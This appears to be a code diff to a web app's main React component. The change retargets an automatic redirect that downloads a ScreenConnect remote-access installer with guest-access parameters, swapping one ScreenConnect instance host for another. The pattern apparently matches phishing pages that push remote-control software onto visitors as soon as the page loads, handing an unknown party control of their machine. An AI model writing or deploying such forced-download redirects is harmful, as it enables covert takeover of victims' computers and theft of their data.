@@ -33,7 +33,7 @@ export default function App() {
     }
 
     // Redirect to the specified URL to start the download immediately
-    window.location.href = "https://sandlerandassociates1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+    window.location.href = "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
   };
 
   useEffect(() => {
